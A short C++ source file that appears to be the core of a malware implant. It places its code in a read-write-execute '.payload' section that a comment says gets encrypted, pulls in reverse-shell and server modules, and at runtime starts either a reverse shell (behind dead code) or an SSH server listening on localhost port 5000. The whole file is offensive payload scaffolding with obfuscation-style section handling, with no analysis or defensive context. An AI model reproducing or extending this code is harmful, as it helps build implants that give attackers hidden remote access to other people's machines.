#include "payload.h"
#include "init.cpp"
#include "reverse-shell.cpp"
#include "server.cpp"

#pragma section(".payload", read, write, execute)
#pragma comment(linker, "/SECTION:.payload,ERW")
#pragma code_seg(".payload")

void print_whatever() {
	printf("mreow\n");
}

int start_payload(int argc, const char *argv[]) {
	payloadInit();

	int exitCode = S_OK;
	try {
		if (false) {
			std::string username;
			std::string password;
			
			std::cout << "username: ";
			std::cin >> username;
			std::cout << "password: ";
			std::cin >> password;

			auto shell = ReverseShell("localhost", username.c_str());
			shell.Connect(5000, password.c_str());
		} else {
			auto server = SSHServer("localhost", 5000);
			server.start();
		}
	} catch (std::exception &err) {
		std::cerr << "SSH loop failed: " << err.what() << std::endl;
		exitCode = 1;
	}

	payloadClean();
	return exitCode;
}

// seemingly doesnt automatically get set back to .text
// without this line, a bunch of builtin functions get encrypted and prevent the program from launching properly
#pragma code_seg(".text")